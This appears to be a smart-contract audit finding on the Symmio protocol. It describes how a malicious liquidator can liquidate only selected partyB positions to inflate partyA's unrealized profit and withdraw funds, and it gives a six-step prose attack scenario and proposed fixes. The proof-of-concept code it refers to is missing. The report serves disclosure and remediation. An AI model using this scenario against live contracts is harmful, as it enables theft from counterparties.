# liquidatePositionsPartyB can be used by malicious liquidator to liquidate only select positions which artificially inflates partyA upnl and allows to steal funds

## Summary

Liquidating partyB is a 2-step process. First, liquidator calls `liquidatePartyB`, and then `liquidatePositionsPartyB` can be called 1 or more times, each call with an array of quotes (positions) to liquidate, until all positions are liquidated. However, after the 1st step but before the 2nd step finishes - partyA can still do anything (like deallocating funds) with upnl calculations using positions between partyA and liquidated partyB (muon app doesn't check for liquidation of active position's parties, and smart contract code also ignores this).

Malicious liquidator can liquidate only positions which are in a loss for the partyA (keeping positions which are in a profit for the same partyA), temporarily artificially inflating upnl for this partyA. This allows partyA to deallocate max funds available, effectively stealing them. After the partyB liquidation process finishes and all positions are liquidated, partyA goes into a very high bad debt.

## Vulnerability Detail

`liquidatePartyB` sends all (or most of the) partyB's funds to partyA:

`liquidatePositionsPartyB` can be called by any liquidator with an array of quotes, so liquidator chooses which positions he will liquidate and which positions will remain active:

https://github.com/sherlock-audit/2023-06-symmetrical/blob/main/symmio-core/contracts/facets/liquidation/LiquidationFacetImpl.sol#L331-L372

The liquidation process only finishes when all active partyB quotes/positions are liquidated, but until then, the first liquidator will have a choice of what quotes will remain active for a short time before next liquidator. During this time partyA will have incorrect upnl, because it will count some subset of positions, which can be chosen by liquidator.

While this bug mainly concerns muon app (which provides signed upnl for users), which is out of scope, the same logic flaw is also present in some parts of the smart contract code, such as closing positions. `requestToClosePosition` doesn't have any checks for either party liquidation status:

https://github.com/sherlock-audit/2023-06-symmetrical/blob/main/symmio-core/contracts/facets/PartyA/PartyAFacetImpl.sol#L148-L191

`fillCloseRequest` doesn't have any checks for liquidation status either:

https://github.com/sherlock-audit/2023-06-symmetrical/blob/main/symmio-core/contracts/facets/PartyB/PartyBFacetImpl.sol#L256-L293

There is also lack of liquidation check in the `liquidatePositionsPartyA`. This is the bug, which can be combined with this one to steal all protocol funds.

The following scenario is possible for malicious partyA to steal funds:

1. partyA opens LONG position with "good" partyB

2. At the same time, partyA opens 2 opposite (LONG and SHORT) positions with controlled partyB2 with minimally accepted allocated balance (with slightly different sizes, so that if price goes against partyA, partyB2 will be liquidatable)

3. When price goes against partyA (it has large loss in a position with partyB), partyB2 becomes liquidatable

4. partyA uses controlled liquidator to liquidate partyB2 and calls `liquidatePositionsPartyB` but only with `quoteId` of the LONG position (which is in a loss for partyA)

5. After that, partyA will have a very large profit from its SHORT position with partyB2, which will offset the loss from LONG position with partyB (LONG position with partyB2 is liquidated). partyA can deallocate it's full allocated balance, as the artificial unrealized profit allows to do this.

6. Any liquidator can finish liquidating partyB2, at this point partyA will go into bad debt, but since its allocated balance is 0, after partyA liquidation - partyB won't get anything and will lose all its profit. Effectively partyA has stolen funds from partyB.

It is also possible to just outright steal all funds from the protocol by using another bug (liquidation of partyA to inflate allocated balances of controlled partyB), but that's out of context of this bug.

## Impact

Any partyA which is in a loss on any of its position, can exploit the bug to temporarily inflate upnl and deallocate all funds at the expense of the other party, which won't get the profit from partyA positions due to bad debt.

Combining it with the other bug allows to steal all protocol funds.

Add this to any test, for example to `ClosePosition.behavior.ts`.

Manual Review

## Recommendation

There are different ways to fix this vulnerability and it depends on what the team is willing to do. I'd say the safest fix will be to introduce some `temporarily locked` status for the partyA, and when any partyB is liquidated, connected partyA is put in this temporary status, which is lifted after liquidation finishes, so that the user can't do anything while in this status. However, this is a lot of work and possible room for more bugs.

Another way is to add liquidation check to muon app and when calculating unrealized profit/loss - ignore any positions for which either party is in liquidated status. And also fix the smart contract code to include this check as well (for example, it's possible to close position with liquidated partyB - there are no checks that partyB is not liquidated anywhere). This is the easier way, but might create problems in the future, if further features or protocols building on top won't take this problem into account.
